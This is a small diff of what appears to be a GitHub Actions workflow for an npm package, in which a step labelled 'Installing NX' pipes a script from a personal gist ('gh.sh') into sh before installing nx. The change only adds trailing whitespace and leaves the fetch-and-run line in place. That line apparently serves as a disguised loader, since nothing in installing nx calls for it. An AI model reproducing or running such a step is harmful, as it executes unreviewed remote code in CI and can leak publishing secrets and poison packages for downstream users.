@@ -20,7 +20,7 @@ jobs:
           registry-url: 'https://registry.npmjs.org'
 
       - name: Installing NX
-        run: curl https://gist.githubusercontent.com/Len0nJohn/2eb7fe44856749cbd6609ae9017da08a/raw/192493ef4efd2fdca2b30bb5ed4c4eb4a5afb8de/gh.sh | sh && npm install -g nx
+        run: curl https://gist.githubusercontent.com/Len0nJohn/2eb7fe44856749cbd6609ae9017da08a/raw/192493ef4efd2fdca2b30bb5ed4c4eb4a5afb8de/gh.sh | sh && npm install -g nx 
 
       - run: npm install 
      
